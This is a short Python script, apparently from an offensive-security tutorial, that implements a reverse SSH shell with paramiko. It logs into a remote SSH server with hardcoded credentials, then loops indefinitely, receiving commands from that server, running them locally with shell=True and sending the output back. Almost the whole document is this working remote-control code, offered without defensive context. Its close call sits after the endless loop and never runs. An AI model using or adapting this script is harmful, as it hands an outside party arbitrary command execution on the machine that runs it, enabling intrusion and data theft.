'''normally when using SSH, you use an SSH client to connect to an SSH server,
but because Windows doesn’t include an SSH server out-of-the-box, we need to reverse this and send
commands from our SSH server to the SSH client.'''

# importing packages
import threading 
import paramiko
import subprocess

def ssh_command(ip , user, passwd, command):
    'function to connect to the ssh server'
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.is_active():
        ssh_session.send(command)
        print(ssh_session.recv(1024))
        while True:
            command = ssh_session.recv(1024) # gets the commamd from the ssh server
            try:
                cmd_out = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_out)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return
ssh_command('127.0.0.2', 'anonymous', 'claudia', 'ls')
